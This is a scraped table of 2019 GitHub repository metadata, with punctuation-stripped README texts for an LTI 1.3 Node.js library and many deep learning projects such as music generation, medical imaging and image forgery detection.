Tool Manage Tools At a minimum the following fields should be setup Tool s Name Tool s Base URL Tool s Description if desired Mark the tool as a LTI1 3 Tool Tool s Public Key you will need to come back and add this in a moment see below about obtaining your Public key Initiate Login URL oidc Redirection URIs all of the endpoints that may be used for example project submit Enable Assignment and Grade Services if Tool should send grades to Platform Enable sharing of launcher s name if Tool should have ability to display this information Choose Always Accept grades from the Tool if Tool should send grades to Platform After saving the External Tool the Platform will assign a Client ID to the Tool and provide endpoints Make note of all of this information as it will be used in Step 5 The next step will be to add the Tool to course s This can be done by an Administrator or a Teacher In Moodle the steps are to navigate the appropriate course and use the Gear icon to Turn editing on You will then be able to Add an Activty or Resource for an External Tool Simply give it a name and select the Tool you added above from the drop down box for Preconfigured tool Click Save and return to course 5 Register Platform with Tool In order register a Platform with the Tool add a call to registerPlatform in your server file with the values you received from Step 4 For reference here is a screenshot from the Moodle sandbox showing these values Moodle Tool Config MoodleToolConfig png this screenshot from Moodle registerPlatform consumerUrl Base url of the Platform 1st line on screenshot Platform ID from Moodle consumerName Domain name of the Platform e g Moodle s Demo consumerToolClientID Client ID generated upon configuration of an external tool on the platform 2nd line on screenshot consumerAuthorizationURL URL that the Tool sends Authorization Requests Responses to 6th line on screen shot Authentication request URL consumerAccessTokenURL URL that the Tool can use to obtain an access Tokens 5th line on screen shot Access Token URL consumerRedirectURL Tool s base URL PLUS slash route where Example Tool is served from e g locally cloud https node lti v1p3 herokuapp com PLUS project submit consumerAuthorizationconfig WILL always be an object with two properties Authentication method and key for verifying messages from the Platform method will be JWKSET and key will be on 4th line of screen shot Public keyset URL For example registerPlatform https demo moodle net Moodles demo BMe642xnf4ag3Pd https demo moodle net mod lti auth php https demo moodle net mod lti token php https piedpiper localtunnel me project submit method JWKSET key https demo moodle net mod lti certs php 6 Run your Server Once the Tool is integrated with the Platform your server must be up and running so that the Tool can be accessed In a development environment start your MongoDB and your server in separate terminals mongod npm start Now that your server is running you are able to access the Tool s generated Client Public key by making a GET request with as a parameter to publickey This key must be put into the Tool s Public Key field in Step 4 above on the Platform 7 Optional Activities Test Suite The Library provides a test suite to verify portions of the basic functionality To launch the automated tests for this Library run in separate terminals mongod npm test Glossary JWT JSON Web Tokens JWTs are an open industry standard that supports securely transmitting information between parties as a JSON object Signed tokens can verify the integrity of the claims contained within it https openid net specs draft jones json web token 07 html LTI 1 3 The IMS Learning Tools Interoperability specification https www imsglobal org spec lti v1p3 allows Platforms to integrate external Tools and content in a standard way As of 2019 LTI v1p3 is the latest standard LTI Advantage Services https www imsglobal org spec lti v1p3 impl built on top of LTI 1 3 for Assignment and Grades Services https www imsglobal org spec lti ags v2p0 Names and Roles Provisioning Services https www imsglobal org spec lti nrps v2p0 Deep Linking Services https www imsglobal org spec lti dl v2p0 LTI v1 3 and the LTI Advantage together this set of services incorporate a new model for secure message and service authentication with OAuth 2 0 https www imsglobal org activity learning tools interoperability LMS Learning Management System Referred to as Platforms in this document OAuth 2 0 LTI 1 3 specifies the use of the OAuth 2 0 Client Credential Grant mechanism to secure web services between trusted systems This Library makes use of JSON Web Tokens JWT for the access tokens https www imsglobal org spec security v1p0 OIDC OpenID Connect is a simple identity layer on top of the OAuth 2 0 protocol It allows Clients to verify the identity of the End User based on the authentication performed by an Authorization Server as well as to obtain basic profile information about the End User in an interoperable and REST like manner https openid net connect Platform previously referred to as the Tool Consumer is the Learning Management System LMS that the educational provider is using Examples are Moodle Blackboard Edgenuity Canvas Schoology etc Tool previously referred to as the Tool Provider this is the external Tool that contains educational material to include in a course Tools can range from a single piece of content for example a quiz to an extensive interactive website featuring specialized course content Contributors Argenis De Los Santos Gian Delprado Godfrey Martinez Michael Roberts Sherry Freitas Keywords LTI LMS Tool LTIv1 3 Node Express Javascript,2019-08-02T17:55:38Z,2019-11-01T17:21:12Z,JavaScript,GianFiyah,User,2,2,2,10,master,GianFiyah,1,0,0,1,0,1,0
vasukumar92,Improvise-a-Jazz-Solo-with-a-LSTM-Network,n/a,Improvise a Jazz Solo with a LSTM Network You would like to create a jazz music piece specially for a friend s birthday However you don t know any instruments or music composition Fortunately you know deep learning and will solve this problem using an LSTM netwok You will train a network to generate novel jazz solos in a style representative of a body of performed work Process Flow Apply an LSTM to music generation Generating jazz music with deep learning,2019-08-01T05:47:59Z,2019-08-16T20:59:20Z,Jupyter Notebook,vasukumar92,User,1,2,1,3,master,vasukumar92,1,0,0,0,0,0,0
prasoonkottarathil,2relu_ratenow,n/a,2reluratenow 2reluratenow is an user based movie rating prediction system an user before watching a movie our system could able rate the movie using autoencoder deep learning model data collection is done by using microcontrollers for training and testing model was done in 100k movive dataset https grouplens org datasets movielens dataset is uploded here but all dataset credits goes for grouplens org to see my project implementation https www instagram com p Bw9czDQFzJ2,2019-07-10T07:22:49Z,2019-07-23T18:59:00Z,Python,prasoonkottarathil,User,0,2,0,5,master,prasoonkottarathil,1,0,0,0,0,0,0
kb22,Tensorflow-Course,googlecolab#python#tensorflow#tutorial#udacity,Tensorflow Course This repository includes my take on the free Tensorflow course available on Udacity The course is available on Udacity https www udacity com course intro to tensorflow for deep learning ud187,2019-07-02T12:36:45Z,2019-08-03T09:38:47Z,Jupyter Notebook,kb22,User,0,2,1,17,master,kb22,1,0,0,0,0,0,0
LeadingIndiaAI,Liver-Tumor-Segmentation,n/a,LiTS This code is the solution to the Liver Tumor Segmentation Challenge from www codalab org To run this code the train images and masks should be converted to bmp files and can be done through Trainbmpconversion py and these files can be listed into csv using utils py training py can be used for training the model VNET in this case and prediction can be done by prediction py i e converting the test data into bmp or npy files using the testnpyconversion py file,2019-07-25T05:42:41Z,2019-08-20T12:00:07Z,Python,LeadingIndiaAI,User,0,2,0,3,master,bavenkat1,1,0,0,1,0,0,0
akshaykvnit,pamap2_har_expts,human-activity-recognition#keras#pandas#pytorch,,2019-07-18T13:21:20Z,2019-12-13T14:34:54Z,Jupyter Notebook,akshaykvnit,User,0,2,0,11,master,akshaykvnit,1,0,0,0,0,0,0
codepradosh,Automatic-Music-Generation-System,n/a,Automatic Music Generation System Generating Irish Folk Tunes and Lyrics using LSTM This project uses Long Short term Memory LSTM based recurrent neural network RNN to generate music and lyrics using the Irish Folk Music dataset Additionally it also generates Bob Dylan esque lyrics using all of Bob Dylan s songs Summary We use the power of Deep Learning to train LSTM Networks to creatively generate Irish Folk Tunes and Bob Dylan lyrics Write up datasets irish folk music As a lover of folk tunes particularly Irish tunes I found these datasets immensely helpful O Neill s Irish Music dataset Source http trillian mit edu jc music book oneills 1850 X Cobb s Irish Music dataset Source http cobb ece wisc edu irish Tunebook html Nottingham Music dataset ABC version of Nottingham music dataset http abc sourceforge net NMD I wrote a scraper to scrape O Neill s and Cobb s data from the sites clean up the data and combine them in one file Bob Dylan Songs I scraped the Bob Dylan songs site http bobdylan com songs downloaded the lyrics separately and combined them in one text file It comes down a mere 700KB dataset which is tiny for the purposes of training an RNN For copyright reasons Bob Dylan s lyrics are not included in this repo Char RNN Based Generator The mechanics of the text generation uses a Char RNN based generator as decribed by Andrej Karpathy http karpathy github io 2015 05 21 rnn effectiveness To create an RNN specify the modeltype as one lstm rnn or gru In general the LSTM type networks have shown to be more effective per Karpathy Specify these params batchsize sequences in a mini batch sequencelength number of characters in a sequence ncells number of cells in the hidden RNN layers nlayers number of layers in the RNN ckptname unique name for the model used to save the model or restore from it learningrate how fast or slow the network should learn typically 0 001 but can be set to 0 0001 ABC Music Format The ABC Music format is a text based music format Here s one such tune called Julia Delaney in ABC format See a youtube sample here https www youtube com watch v DUZ6zei3fRU 174 T Julia Delaney Z id dc reel 161 M C L 1 8 K D Minor A dcAG F2DF E2CE F2DF dcAG F2DF Add c defe dcAG F2DF E2CE F2DF dcAG F2DF Add c d3 e fede fagf ecgc acgc fede fagf edcA Adde fede fagf ecgc acgc fedf edcA Add c d3 As can be seen the format is incredibly compact Each line begins with a single letter field except for notes ABC notation for music link http abcnotation com X denotes a reference number M denotes Meter K denotes the Key L denotes the beats T denotes the Title Z denotes the transcription The rest are notes that denote the melody for the song As one can see this text data is useful to train an RNN to generate a similarly structed abc which can then be converted into MIDI format and from there to WAV or OGG format to play Refrences A few of the references that helped me More useful for future work 1 Andrej Karpathy Unreasonable Effectiveness of RNN https karpathy github io 2015 05 21 rnn effectiveness 2 Music Generation using RNN with char rnn https maraoz com 2016 02 02 abc rnn 3 Analyzing Deep Learning Tools for Music Generation Asimov Institute http www asimovinstitute org analyzing deep learning tools music 4 Hexahedria Daniel Johnson Composing Music with RNN http www hexahedria com 2015 08 03 composing music with recurrent neural networks 5 Kyle McDonald Creative AI Return to ML https medium com kcimc a return to machine learning 2de3728558eb 66hboziec 6 Folk Music Generation Bob Sturm https highnoongmt wordpress com 2015 05 22 lisls stis recurrent neural networks for folk music generation WaveNet DeepMind Keras Implementation https github com basveeling wavenet,2019-08-04T12:01:30Z,2019-10-03T14:08:08Z,Jupyter Notebook,codepradosh,User,1,2,0,6,master,codepradosh,1,0,0,0,0,0,0
kjdnl,the-project-of-steel-plate-classification-with-transferL,steel-plate-classification#transfer-learning,the project of steel plate classification,2019-07-18T13:57:24Z,2019-08-07T02:25:14Z,n/a,kjdnl,User,0,2,0,3,master,kjdnl,1,0,0,0,0,0,0
AmirAslanHaghrah,Dataset-Builder,n/a,Dataset Builder The recent development in Deep Learning algorithms and libraries and their extraordinary good results in modeling phenomena classification estimation and etc make an excessive tendency to this field Developing deep neural networks models and assessing these model performance are severely based on the good train and test data Dataset Builder is a software for labeling images easily to make a reliable train and test datasets Also it has a Python extension which can use to feed our dataset to libraries like Tensorflow Keras and etc easily Screenshot Resources Main png,2019-07-18T17:03:28Z,2019-10-21T09:12:22Z,C#,AmirAslanHaghrah,User,0,2,0,9,master,AmirAslanHaghrah,1,1,1,0,0,0,0
mahitaberrefae,Malware-Detection,n/a,GP Graduation Project This is my graduation project under supervision of Dr Khaled Fouad Elsayed and Dr Husam Kinawi And technically supported by Dr Dina Salem The project briefly is a bout Android malware detection system using a deep learning technique called graph convolutional neural networks GCN The network works on android applications Some information about the application is extracted and added to the windows event log of the server containing the network This is the main server which is a part of a local area network that contains a number of computers that send their windows event logs to Elastic Stack The Elastic Stack is used to visualize this data on a browser to do some further analysis,2019-07-24T16:17:42Z,2019-10-12T15:00:24Z,Python,mahitaberrefae,User,1,2,0,2,master,mahitaberrefae,1,0,0,0,0,0,0
ashish-code,MRI-QA,n/a,Project Under Development MRI QA The assessment of quality of MRI is in important precursor to ameliorating biases in subsequent data analysis and precluding erroneous acquisitions Since manual visual inspection is impractical for large volumes of data as well as being subjective in nature it is very useful to automate the task of image quality assessment IQA There is existing research on IQA that typically utilize hand crafted visual features in conjunction with machine learning algorithms However these techniques have been made obsolete in many research fields by much more powerful and expressive deep learning based models We introduce a model that uses a Convolutional Neural Network for feature extraction from 3D volumes of MRI data of a subject and a Fully Connected Network for classification of the quality of the MRI This model is trained on a multi site freely available dataset called ABIDE 1 used in study of Autism By utilizing two of the seventeen sites as hold out data we demonstrate that our model achieves state of art performance on unseen data from novel sites Furthermore we evaluate our trained model on a MRI dataset from TCIA used in study of Glioblastoma to demonstrate the ability of our model to effectively adapt to different types of neuro imaging data Introduction Image analysis on data with artifacts can lead to misleading diagnosis It is therefore very important that data be processed for quality control prior to analysis MRI data is rarely completely devoid of artifacts The assessment of their quality has been a challenging research topic for a long time The traditional approach is to inspect MRI images visually by one or more experts the images of unacceptably poor quality are pruned out Manual assessment is costly in terms of time and subject to a degree of ambiguity due to subjective differences between raters There is also intra rater variation due to fatigue Although MRI acquisition devices are regularly inspected they do nevertheless tend to drift from their calibrated settings All of these conditions underscore the importance of reliable quality control at the preliminary stages of the processing pipeline for diagnosis The principal challenges facing quality assessment are absence of a universally accepted quantitative definition of quality metrics variation in expert rating for the same MRI inter site variation in acquisition creating uncharacteristic artifacts Quality assessment methods in literature are typically grouped into 3 types Full Reference FR where the original and degraded image pair are available for training a model Partial Reference PR where some information from the original image is available along with the degraded image No Reference NR where the original and degraded pair are never available Our focus is NR quality assessment also called Blind quality assessment since there is no known dataset of the same MRI with and without artifacts Contributions We present the first attempt at employing a 3D CNN based deep learning approach to image quality assessment in MRI data Our approach leverages the state of art ability of deep learning at both accurate representation of artifacts in MRI and transferability of the trained model to other sites and even different types of neuro imaging data The only meaningfully similar work to our knowledge utilized hand crafted features called Image Quality Metrics and basic machine learning classifier like Random Forest citeEsteban2017 While other methods look to assess quality in 2D image slices our model is trained with 3D volumes which makes is inherently better suited to model information between slices and adapt to different types and locations of artifacts The backbone of our model is trained using medical images sources from numerous sites and multiple modalities We then fine tune our model on ABIDE 1 dataset This approach allows our pre trained model to be flexible it can be directly used for quality assessment on data from a different site and it can also be alternatively optimized for a specific data acquisition modality IQMs We have utilized Image Quality Metrics IQMs as features and build a FCN for quality assessment on ABIDE 1 and DS030 MRI datasets Overview of the IQMs we used is tabulated below Image Quality metrics https www dropbox com s y77ergfdclwh3lh iqms png raw 1 The FCN network architecture is FCN model architecture https www dropbox com s sh6vbu8r0bcmde6 networkarch PNG raw 1 The current training validation and testing performance is Training and Validation Performance https www dropbox com s 3k23k4quj3lo3bj performance png raw 1 The aggregate performance is Quality Assessment performance https www dropbox com s sfzv1hcwdhg8p76 resultstable png raw 1,2019-07-18T12:37:12Z,2019-10-03T06:17:14Z,Python,ashish-code,User,0,2,0,19,master,ashishgupta#ashish-code,2,0,0,0,0,0,0
radhe-raman-tiwari,Rice-crop-Insects-and-Weed-Detection-using-faster-R-CNN,n/a,INSECTS AND WEED DETECTION AND CLASSIFICATION FROM RICE CROP FIELD USING FASTER R CNN Abstract As the increase in the world population the demand of the rice is also increases In order to increase the growth of rice in the rice crop it is necessary to detect the weed and insects in the rice crop to minimize the growth of weed and insects so that the growth of the rice can be increased Insect and Weed detection is the important factor to be analyzed Unmanned Air Vehicle UAV is used for data acquisition of rice crop in different phases and states so that high quality of RGB images can be captured In which we have taken 15 different types of rice crop insects species images and different phases of weed images to train the model The proposed method facilitates the extraction of weed and insects into the rice crop eld using deep learning concept faster region based convolutional neural networks Faster R CNNs it is implemented using Python3 with the help of Tensorow API The result shows that Faster R CNN method is the state of arts method for detection and classication of weed and insects with good accuracy rate Keywords Computer vision Deep learning Weed detection Insects detection Rice detection Convolutional neural networks Region based convolutional neural networks Problem Statement Objects contained in image les can be located and identied automatically This is called object detection and is one of the basic problems of computer vision As we will demonstrate region base convolutional neural networks Faster R CNN are currently the state of theart solution for object detection The main task of this thesis is to detection and classification of rice crop insects and weed into rice crop field with the help of images and videos which is taken by UAV User Manual In order to excess project people need to go inside models directory in which we will find some short of directory from them we need to find research directory and then netx we need to find objectdetection directory and after that all these hierarchical directories we need to follow the instruction given on that page README md Again i am showing steps here which we need to follow them in order to use excess this project source code Step 1 Open models directory Step 2 Open research directory Step 3 Open objectdetection directory Step 4 Follow the steps given on that page README md Thank a lot and Regards Radhe Raman Tiwari,2019-06-27T09:16:43Z,2019-11-18T12:17:41Z,Python,radhe-raman-tiwari,Organization,0,2,0,43,master,RadheTians,1,0,0,0,0,0,0
UUDeCART,NLP_Deep_Learning_2019,n/a,NLP Deep Learning 2019,2019-07-25T15:14:00Z,2019-09-16T08:05:55Z,Jupyter Notebook,UUDeCART,Organization,2,1,12,1,master,jpferraro,1,0,0,0,0,0,1
lab-semantics,Deep-Learning-Guide,n/a,alt text https github com lab semantics Deep Learning Guide blob master images logo slsmall png A smooth path to Semantics Lab 1 Basic python Structure OOP Python3 Intro https github com lab semantics Deep Learning Guide tree master Python3 2 1 Configure Deep Learning Environment and Introduction to Anaconda Manage Environments https github com lab semantics Deep Learning Guide blob master Anacondaintro manage environments rst 2 2 Introduction to Numpy Numpy intro https github com lab semantics Deep Learning Guide blob master Numpyintro NumpyInto ipynb 3 Basic Staistical Operation using Python Statistics https github com nuhil deep learning research blob master Data 20Interpretation Data Interpretation ipynb 4 Introduction to OpenCV OpenCV https github com lab semantics Deep Learning Guide tree master OpenCV Intro 5 Indroduction to Deep Learning Deep Learning Intro https github com lab semantics Deep Learning Guide tree master DLintro 6 Intuition of Gradient Descent algorithm Stochastic Gradient Descent https machinelearningmastery com gradient descent for machine learning 7 Introduction to google colab This is very important You can use GPU machine to experiment Deep learning algorithm Which is not possible if you use CPU machine Get started with Google Colaboratory https www youtube com watch v inN8seMm7UI Google Colaboratory Notebook Tutorial with GPU https www youtube com watch v f1UK8KPt KU A Simpe Neural network with Tensorflow Keras using Colaboratory https www youtube com watch v 6upGYUtjdU 8 Introduction to Basic Linux command lines https sh howtocode com bd 9 Resources Numpy and Image processing https note nkmk me en python numpy image processing Basic Machine learning Bangla Tutorials https ml howtocode com bd Basic Deep learning Bangla Tutorials https dl howtocode com bd Machine Learing Crash Course by Google https developers google com machine learning crash course Basic tensor operations Tensorflow https www guru99 com tensor tensorflow html Symbolic and imperative apis in tensorflow 2 0 https medium com tensorflow what are symbolic and imperative apis in tensorflow 2 0 dfccecb01021 10 Books DeepLearningwithPythonbyChollet https github com lab semantics Deep Learning Guide blob master Books DeepLearningwithPythonbyChollet pdf DeepLearningbyIanGoodfellow https github com lab semantics Deep Learning Guide blob master Books DeepLearningbyIanGoodfellow pdf Python Cookbook https github com lab semantics Deep Learning Guide blob master Books PythonCookbook3rd 20Edition pdf Automate The Boring Stuff With Python https github com lab semantics Deep Learning Guide blob master Books automatetheboringstuffwithpython pdf,2019-07-05T05:49:15Z,2019-11-05T12:10:05Z,Jupyter Notebook,lab-semantics,Organization,1,1,5,116,master,menon92#kazalbrur#sagorbrur#iriad11,4,0,0,1,0,1,9
deep-learning-academy,deep-learning-academy.github.io,n/a,Bienvenue la page Outils de la DEEP LEARNING ACADEMY La Deep Learning Academy est une association informelle d universits et de centres de recherches wallons qui se sont fix pour objectif de faciliter les changes d information sur les rcents dveloppements scientifiques et technologiques en IA Initie en 2017 par l Universit Catholique de Louvain l Universit de Mons et le centre de recherche Multitel cette association organise priodiquement des runions auxquelles participent galement des industriels afin de prsenter les dernires avances en IA et changer sur les projets locaux en cours Cette page est un des moyens mis en oeuvre par la Deep Learning Academy pour rendre l IA accessible au plus grand nombre Elle pointe vers une selection d outils bass sur l intelligence artificielle pour rsoudre des t ches selon la classification de la page PapersWithCode https paperswithcode com sota Les outils slectionns sont accompagns d un code de test en python dans un notebook jupyter qu on peut excuter directement dans une session Google Colab et parfois d un white paper un article qui explique de manire fonctionnelle la t che examine et la solution retenue Pour une introduction python en franais voir la page de M Tits https github com titsitits PythonDataScience Pour une introduction Jupyter et Colab voir la page de Google https colab research google com notebooks welcome ipynb Les documents fournis ici sont libres de droits CC BY 2 0 BE https creativecommons org licenses by 2 0 be mais les libriaries logicielles utilises dans ces documents et provenant de tiers sous videmment soumises aux licenses imposes par leurs auteurs le plus souvent nous avons cependant choisi des outils dont les auteurs ont libr les droits Participent la mise en place de cette page cette liste n est pas ferme UCLouvain https uclouvain be UMONS https web umons ac be ULiege http www uliege be Multitel https www multitel be Cetic https www cetic be avec soutien des projets FEDER cofinancs par LUnion Europenne et la Rgion Wallone Logo FEDER FSE https www enmieux be sites default files assets media files signatures vignetteFEDERFSE 2BWAL 2BFWB png Vision par ordinateur https paperswithcode com area computer vision Dtection d objets https paperswithcode com task object detection Readme https github com numediart yolov3tensorflow Notebook https github com numediart yolov3tensorflow blob master test ipynb Synthse d images naturelles https paperswithcode com task conditional image generation Readme https github com numediart ImageSynthesis Notebook1 https github com numediart ImageSynthesis blob master HuggingFace BigGanhandsonai1 ipynb Notebook2 https github com numediart ImageSynthesis blob master ivclab BigGanhandsonai2 ipynb Super rsolution https paperswithcode com task super resolution White paper https docs google com document d 1XUFQAgdzNDIg7zXevipnMst7eMTujhB0yXNJYEhWgY edit usp sharing Notebook https colab research google com github titsitits Testimagessuperresolution blob master Superresolutioncomparison ipynb Rponse des questions sur des images https paperswithcode com task visual question answering Notebook https github com numediart Visual Question Answering Segmentation d instance https paperswithcode com task instance segmentation Notebook https github com numediart InstanceSegmentation Prdiction de la profondeur d une image monoculaire https paperswithcode com task monocular depth estimation Notebook https colab research google com drive 18VnxzAmFutrGK FT6FxPITjMoT3wylgU Comptage de foule https paperswithcode com task crowd counting Readme https github com numediart Crowd Counting with MCNNs Notebook https github com numediart Crowd Counting with MCNNs blob master test ipynb Parole https paperswithcode com area speech Reconnaissance de la parole https paperswithcode com task speech recognition Notebook https colab research google com drive 1Z6VIRZsX314hyev3Gm5gBqvm1wQVo a Synthse vocale https paperswithcode com task speech synthesis Synthse du texte la parole Notebook https colab research google com drive 11okUcZmPmSJF8bWqUnAe4XI7urHLPs Clonage de voix pour la synthse vocale Notebook https colab research google com drive 1WERg0eK9mVZYSbE0faQM4VH3NTdrOuUS Traitement du langage naturel https paperswithcode com area natural language processing Modlisation du langage https paperswithcode com task language modelling Gnration de texte GitHub https github com numediart Text Generation Notebook https colab research google com drive 1d4Ffe cR6TWDgUYDInTUqUTqk1 SyP9O scrollTo hFWa2On1yoZy,2019-06-28T09:33:17Z,2019-10-28T14:54:02Z,n/a,deep-learning-academy,Organization,2,1,4,51,master,thierrydutoit#noetits#titsitits#bl0up#vdbemden,5,0,0,1,0,1,4
hxazem,Image-Forgery-Detection-using-Deep-learning,copy-move#deep-learning#detect-tampring#ela#forgery#image-forgery-detection#models-traind#neural-network#pretraind-models#splicing,Image Forgery Detection using Deep learning image processing with convolutional neural network to Detect tampring in image Project Description This Project Compine Different Deep learning techniques and image processing techniques to detect image tampring Copy Move and Splicing Forgery in Different image Formats either lossy or lossless formats we implement two different techniques to detect tampring i build my own Model with ELA preprocessing and use fine tuning with two different pretraind Models VGG19 VGG15 those Models traind using Google Colab https colab research google com notebooks welcome ipynb recent true Image Forgery Detection Application give user the ability to test images with Application trained Models OR Train the Application Model with New Dataset and Test images with this New Trained Mode You Can watch Application Demo From Youtube https www youtube com watch v 8les9jfMM U t 111s Models 1 Error Level Analysis ELA 1 2 top Accuracy 94 54 epoc12 You Can read More about ELA Frome Here https fotoforensics com tutorial ela php 2 VGG16 Pretraind Model 3 VGG19 Pretraind Model Datasets Those Models traind on Many Datasets to Achive Highest Accuracy 1 MICCF2000 copyMove Dataset contains 2000 images 1300 authentic 700 tampered color images 2048x1536 pixels 2 CASIAV2 splicing Dataset contains 12 614 image 7491 authentic 5123 tampered color images 384x265 pixels Application Description libraries Python version IDE Application coded using GUI library PyQt5 tensorflow Keras API Numpy etc IDE used Pycharm community edition and Anaconda Enviroment with python 3 5 4 References 1 Agus Gunawan 1 Holy Lovenia 2 Adrian Hartarto Pramudita 3 Detection og Image tampering With ELA and Deep learning Informatics Engineering School of Electrical and Informatics Engineering Bandung Institute of Technology 2 Nor Bakiah A W 1 Mohd Yamani I I 2 Ainuddin Wahid A W 3 Rosli Salleh 4 An Evaluation of Error Level Analysis in Image Forensics in IEEE 5th International Conference on System Engineering and Technology Aug 2015 10 11 UiTM Shah Alam Malaysia,2019-07-19T13:32:05Z,2019-12-15T00:17:38Z,Python,hxazem,User,1,1,3,13,master,hxazem,1,0,0,1,0,0,0
jongcye,kspace.deeplearning.MRI,n/a,Paper k Space Deep Learning for Accelerated MRI Accepted by IEEE Transactions on Medical Imaging https arxiv org abs 1805 03779 Implementation MatConvNet matconvnet 1 0 beta24 Please run the matconvnet 1 0 beta24 matlab vlcompilenn m file to compile matconvnet There is instruction on http www vlfeat org matconvnet mfiles vlcompilenn k Space Deep Learning matconvnet 1 0 beta24 examples k space deep learning Please run the matconvnet 1 0 beta24 examples k space deep learning install m Install the customized library Download the trained networks such as image domain learning and k space deep learning Trained network Trained network for image domain learing for 1 coil and 8 coils on Cartesian trajectory is uploaded Trained network for k space deep learning for 1 coil and 8 coils on Cartesian trajectory is uploaded Test data Iillustate the Fig 6 7 and 9 for k Space Deep Learning fro Accelerated MRI MR images from http mridata org are uploaded to train and test For your own training Please use the code at https github com jongcye kspace deeplearning MRI k space deep learning matconvnet 1 0 beta24 examples k space deep learning demotraining m,2019-07-18T02:52:35Z,2019-09-10T16:21:27Z,MATLAB,jongcye,User,0,1,3,7,master,hanyoseob#jongcye,2,0,0,0,0,0,0
sashrikap,aws-deepracer,n/a,AWS DeepRacer Reward functions developed using reinforcement learning for Amazon Web Services DeepRacer University of Iowa Secondary Student Training Program 2019 Research brief Academic poster Overview Through studying combinations of variables and their effects on a virtual car s performance we aimed to optimize a model s accuracy and speed through several timed trials We explored the reinforcement learning technique of pre training in which models are cloned from previous models essentially retaining the training experience that that previous model received These new models also incorporate new reward functions and by exploring the relationship between each source of training we endeavored to study the iterative development of consecutive models Built with Python Jupyter Notebooks Log analysis files were developed using a template provided by Amazon Web Services which can be found here,2019-06-25T16:54:33Z,2019-11-29T08:03:12Z,Jupyter Notebook,sashrikap,User,0,1,2,90,master,sashrikap,1,0,0,0,0,0,0
rahulgarg28071998,AllMachineLearning-DeepLearning,n/a,AllMachineLearning DeepLearning contains all ML Projects,2019-07-01T04:43:57Z,2019-07-04T00:54:23Z,Jupyter Notebook,rahulgarg28071998,User,1,1,0,2,master,rahulgarg28071998,1,0,0,0,0,0,0
trinhdoduyhungss,DeepLearning,n/a,DeepLearning Simple Neural is example about neural network Solution in SimpleNeural js Example Input Output 1 0 0 1 0 2 1 0 1 1 3 1 1 1 1 4 0 1 1 0 5 0 0 0 0 New situation 1 0 0 Result of SimpleNeural js Epoch 200 Loss 0 00005139387640518134 Predict output 0 9999486061235948 Deep Classification is reinforcement learning project about sentences classification,2019-08-01T05:15:19Z,2019-08-13T14:07:30Z,JavaScript,trinhdoduyhungss,User,1,1,0,3,master,trinhdoduyhungss,1,0,0,0,0,0,0
Patrick-Erath,DeepLearning,n/a,DeepLearning Deep Learning Algorithms,2019-06-27T19:33:42Z,2019-07-30T17:48:53Z,Python,Patrick-Erath,User,0,1,0,9,master,Patrick-Erath,1,0,0,0,0,0,0
duyphuongcri,DeepLearning,n/a,,2019-07-14T03:11:16Z,2019-09-28T10:07:29Z,Jupyter Notebook,duyphuongcri,User,0,1,0,0,master,,0,0,0,0,0,0,0
akshaymnair,DeepLearning,n/a,DeepLearning Deep Learning practice problems Binary and Multi class classifiers CNN RNN Transfer Learning Tensorflow Keras Also with sample data sets,2019-07-07T07:33:34Z,2019-07-07T09:45:08Z,Jupyter Notebook,akshaymnair,User,0,1,0,2,master,akshaymnair,1,0,0,0,0,0,0
mihirkr,DeepLearning,n/a,DeepLearning Python Tensorflow Keras,2019-08-03T06:15:28Z,2019-08-19T08:36:36Z,Jupyter Notebook,mihirkr,User,1,1,0,7,master,mihirkr,1,0,0,0,0,0,0
wjddyd66,DeepLearning,n/a,DeepLearning Category 1 Perceptron Perceptron 2 NeuralNetwork 1 Basic Activation Function Activation Function 3 NeuralNetwork 2 Loss Function Loss Function 4 NeuralNetwork 3 Optimazation Optimazation 5 NeuralNetwork 3 Optimazation2 Optimazation 6 NeuralNetwork 4 Backpropagation2 Backpropagation 7 NeuralNetwork 5 Others 8 CNN 3 CNN CNN 9 common dataset wjddyd66 naver com,2019-07-26T09:54:31Z,2019-12-12T09:38:33Z,Jupyter Notebook,wjddyd66,User,0,1,0,25,master,wjddyd66,1,0,0,0,0,0,0
augustine829,DeepLearning,n/a,DeepLearning Machine learning and Deep learning for Robotic cleaner,2019-06-24T07:00:11Z,2019-06-24T22:13:40Z,n/a,augustine829,User,0,1,0,1,master,augustine829,1,0,0,0,0,0,0
nanominos,DeepLearning,n/a,DeepLearning Deeplearning example,2019-07-17T13:49:00Z,2019-07-18T10:45:54Z,Python,nanominos,User,0,1,0,8,master,nanominos,1,0,0,0,0,0,0
FRenzyneedhairs,DeepLearning.ai-Homework,n/a,,2019-07-27T08:32:19Z,2019-09-09T10:26:59Z,Jupyter Notebook,FRenzyneedhairs,User,1,1,0,10,master,FRenzyneedhairs,1,0,0,0,0,0,0
137996047,DeepLearningFrameworks,n/a,DeepLearningFrameworks Demo of running NNs across different frameworks on Windows with CPU 1 resnet18resnet50 resnet18resnet50 2 cpuinferenceGPUGPU cpu Windows 10 Intel R Core TM i7 7700 CPU 3 6GHz 3 60GHz Python 3 6 7 default Jul 2 2019 02 21 41 MSC v 1900 64 bit AMD64 Numpy 1 16 4 PyTorch Version 1 1 0 Caffe2 Version 1 1 0 Tensorflow Version 1 9 0 Keras Version 2 2 4 OnnxRunTime Version 0 4 0 1 anaconda 2 conda create n dlf python 3 6 7 conda activate dlf 3 numpy conda install numpy 1 16 4 4 pytorch conda install pytorch cpu torchvision cpu c pytorch 5 caffe2 pytorchcaffe2google 6 tensorflow conda install tensorflow 1 9 0 7 onnxruntime pip install onnxruntime 0 4 0 MKLDNN Ngraphhttps github com microsoft onnxruntime blob master BUILD md 8 keras conda install keras 2 2 4 8 conda install pandas tqdm 1 models readmepytorch keras 2 infer py result bs 1 2 4 8bscpucores batch size 1 fps batch size 1 DL Library resnet50 resnet18 Keras 2 2 TensorFlow 3 9 PyTorch 5 7 11 3 Caffe2 14 6 Onnxruntime 25 8 59 0 Onnxruntime mkldnn 25 4 71 6 Onnxruntime ngraph 36 1 89 8 OnnxruntimemkldnnONNX 1 TensorFlow Keras Caffe2 resnet18 2 PyTorch TensorFlow WindowsMKLDNN Pytorch https github com pytorch pytorch issues 22962 TensorFlow https www tensorflow org guide performance overview 1 TensorFlow MKLDNN https www anaconda com tensorflow in anaconda 2 ONNX github https github com onnx onnx 3 onnxruntime githubhttps github com microsoft onnxruntime 4 PyTorch github https github com pytorch pytorch 5 PyTorch MKLDNN If you build PyTorch with MKLDNN enabled https github com pytorch pytorch blob 0408697317de6146ed9e5445faaeab49828310b1 setup py L45 you can then create MKLDNN tensors by tensor tomkldnn And operations like linear https github com pytorch pytorch blob 0408697317de6146ed9e5445faaeab49828310b1 aten src ATen native Linear cpp L15 would automatically use mkldnn 6 